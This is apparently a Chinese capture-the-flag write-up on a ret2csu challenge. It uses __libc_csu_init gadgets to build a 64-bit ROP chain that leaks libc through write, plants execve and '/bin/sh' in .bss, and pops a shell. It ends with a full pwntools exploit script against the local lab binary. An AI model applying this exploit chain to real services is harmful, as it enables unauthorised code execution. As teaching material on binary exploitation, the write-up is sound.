# Level 2 Writeup

## ret2csu复现与分析

### 技术点

- checksec检查可执行文件与内核安全属性
- 使用反汇编工具（IDA pro）查找缓冲区溢出入口和可利用的源码片段
- 使用二进制调试工具（gdb）查看寄存器与内存内容
- 利用`__libc_csu_init`函数中的gadgets来实现64位程序的ROP攻击
- 利用`write`函数泄露`libc.so`在内存中的地址，从而找到`system`函数的地址
- 泄露共享库基地址
- 通过 got 表泄露共享库中函数的偏移地址
- 利用gadgets构造栈帧，通过ROP调用系统调用
- 计算需要覆写的返回地址的偏移
- payload构造

### 分析

首先通过checksec检查可执行文件的保护机制

![image-20230425110337603](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251103650.png)

能够得知以下信息：

- 可执行文件为是一个64位的英特尔x86可执行文件，使用小端序编码。
- 开启了“部分Relocation Read-Only”技术。
- 没有开启“堆栈金丝雀（stack canary）”技术。
- 开启了“No-eXecute”保护技术。
- 没有开启“独立位置可执行（Position Independent Executable）”技术。

接下来通过IDA pro查看反汇编反编译源码：

![image-20230425110558553](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251105579.png)

![image-20230425114418532](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251144551.png)

可以看`vulnerable_function()`函数中明显的缓冲区溢出漏洞入口`read()`，因此查找是否有可以利用的工具函数与字符串。但是没有在程序中查找到`/bin/sh`字符串或`system()`函数等易于利用的工具。因此借鉴level1中题目思路利用libc中比较齐全的代码。

- 利用`write()`函数输出并计算libc.so在内存中的地址，从而找到`system()`的地址
- 然后再传递“/bin/sh”到.bss段
- 最后调用`system(“/bin/sh”)`

但在利用中遇到如下问题，本题为64位程序，无法通过栈向函数的前6个参数传值，只能通过寄存器传值。

![image-20230425111740513](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251117526.png)

然而使用ROPgadget并没有找到类似于`pop rdi, ret`,`pop rsi, ret`这样的gadgets。根据题目提示，可以使用所有调用lib.so的程序都会用来对libc进行初始化操作的`__libc_csu_init()`函数中的gadgets。

![image-20230425112106972](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251121009.png)

使用`objdump -d retcsu`观察`__libc_csu_init()`函数。可以看到

- 利用`0x400606`处的代码可以控制`rbx`、`rbp`、`r12`、`r13`、`r14`和`r15`的值
- 利用`0x4005f0`处的代码可以将`r15`的值赋值给`rdx`、 `r14`的值赋值给`rsi`、`r13`的值赋值给`edi`。`rdx`、`rsi`、`edi`恰好是64位程序函数调用传参的前三个寄存器，因此可以借此构造参数
- 上述位置随后调用了`call qword ptr [r12+rbx*8]`。若将`rbx`的值赋值为0，再通过精心构造栈上的数据，就可以控制`pc`寄存器调用任意函数。
- 执行完`call qword ptr [r12+rbx*8]`之后，程序会对`rbx+=1`，然后对比`rbp`和`rbx`的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让`rbp`和`rbx`的值相等，可以将`rbp`的值设置为1，从而实现gadgets的连续利用。

因此构思获得shell的攻击流程如下：

1. 通过`gets()`构造缓冲区溢出攻击，劫持控制流
2. 利用`libc_csu_gadgets`获取`write`函数地址，通过`write`函数泄露出来，并使得程序重新执行`main`函数
3. 使用`libcsearcher`，基于`write`函数地址，获取对应libc版本以及`system`函数地址
4. 再次在`main`函数通过`gets()`构造缓冲区溢出攻击，劫持控制流
5. 利用栈溢出执行`libc_csu_gadgets`，调用`read`函数向.bss段写入`system`地址以及 '/bin/sh’ 地址，并使得程序重新执行`main`函数
6. 再次在`main`函数通过`gets()`构造缓冲区溢出攻击，劫持控制流
7. 利用栈溢出通过`libc_csu_gadgets`执行`system('/bin/sh')`弹出一个shell供攻击者使用

### 攻击复现

接下来实现攻击，同level 1中题目，要先确定`vulnerable_function()`函数返回地址。

![image-20230425115834949](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251158983.png)

在`call _read`的地址`0x000000000040055d`处下断点，可以看到：栈指针寄存器rsp此时的地址为`0x00007fffffffdd90`；基址指针寄存器rbp的地址为`0x00007fffffffdd10`。通过计算可得，s 相对于 rbp 的偏移为 `0x00007fffffffdd90-0x00007fffffffdd10=0x80`。此时内存结构如下图所示：

![image-20230425153726319](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251537381.png)

根据上述思路编写第一轮运行的payload，构造内存结果如下：

![image-20230425160142856](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251601918.png)

> 其中write函数的三个参数意义如下
>
> - 文件描述符，一般置1
> - 指定的缓冲区，即指针，指向一段内存单元；
> - 要写入文件指定的字节数；

接下来因为程序重新从main开始运行，继续构造第二轮运行的payload，需构造内存结果如下：

![image-20230425160147984](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251601019.png)

> 其中write函数的三个参数意义如下
> - 文件描述符，一般置1
> - 指定的缓冲区，即指针，指向一段内存单元；
> - 要写入文件指定的字节数；

接下来程序依然重新从main开始运行，继续构造第三轮运行的payload，需构造内存结果如下：

![image-20230425160813064](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251608094.png)

最终的payload如下：

```python
from pwn import *
from LibcSearcher import LibcSearcher

ret2csu = ELF('./ret2csu')
sh = process('./ret2csu')

write_got = ret2csu.got['write']
read_got = ret2csu.got['read']
main_addr = ret2csu.symbols['main']
bss_base = ret2csu.bss()
csu_front_addr = 0x400600
csu_end_addr = 0x40061A

# First round - leak write address
sh.recvuntil(b'Hello, World\n')
sh.send(b'a' * 136 + p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(write_got) + p64(1) + p64(write_got) + p64(8) + p64(0x4005F0) + b'a' * 56 + p64(main_addr))
sleep(1)

# calculate libc_base and get the address of execve
write_addr = u64(sh.recv(8))
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
execve_addr = libc_base + libc.dump('execve')

# Second round - write /bin/sh to bss and call execve
sh.recvuntil('Hello, World\n')
sh.send(b'a' * 136 + p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(read_got) + p64(0) + p64(bss_base) + p64(16) + p64(0x4005F0) + b'a' * 56 + p64(main_addr))
sleep(1)

# Third round - call execve
sh.send(p64(execve_addr) + b'/bin/sh\x00')
sh.recvuntil('Hello, World\n')
sh.send(b'a' * 136 + p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_base) + p64(bss_base+8) + p64(0) + p64(0) + p64(0x4005F0) + b'a' * 56 + p64(main_addr))

sh.interactive()
```

运行payload脚本，可以成功得到shell。

![image-20230425163803564](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251638604.png)